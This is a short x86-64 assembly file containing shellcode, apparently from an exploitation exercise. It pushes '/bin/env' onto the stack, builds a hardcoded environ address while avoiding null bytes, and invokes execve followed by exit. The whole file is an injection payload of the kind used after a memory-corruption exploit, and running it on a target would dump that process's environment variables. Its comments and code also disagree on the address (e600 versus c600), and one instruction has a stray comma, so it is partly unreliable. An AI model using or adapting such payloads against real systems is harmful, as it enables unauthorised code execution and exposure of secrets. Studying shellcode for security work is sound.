        bits 64
        nop
start: ; set up data on stack
        xor r8,r8       ; push 0
        push r8
        mov rdi, '/bin/env'
        push rdi
        mov rdi, rsp
        push r8         ; push 0
        push rdi
        mov rsi, rsp
        ; load contents of environ in to ads (mov rdx, [qword 0x7ffff7fbe600] without 0x00)
        xor rdx, rdx    ; Clear the RDX register
        mov dx, 0x7fff  ; Load 0x7fff into the low 16 bits of RDX (DX)
        shl rdx, 32     ; Left shift RDX by 32 bits
        mov ecx, 0xf7fbc601 ; Load 0xf7fbc600 into the low 32 bits of RCX (ECX)
        dec ecx,         ; since 00 of rdx address will lead to null, we decrease one 
        xor cl, cl      ; Clear the low 8 bits of RCX (CL)
        or rdx, rcx     ; Combine the registers using the OR instruction
        ; Load the RDX register with the memory pointed to by the RDX register
        mov rdx, [rdx]
        ; set up system call
        xor rax, rax ; ensure rax is 0
        mov al,0x3B
        syscall
        ; exit system call
        ; Move the RAX register to RDI
        mov rdi, rax
        ; Move the value 0x3c to RA
        xor rax, rax ; ensure rax is 0
        mov al,0x3c
        syscall
        dq 0xffffffffffffffff  ; space for data so stack ; does not overflow the code.
        dq 0xffffffffffffffff
        dq 0xffffffffffffffff
        dq 0xffffffffffffffff
        dq 0xffffffffffffffff
        end: dd end-start

    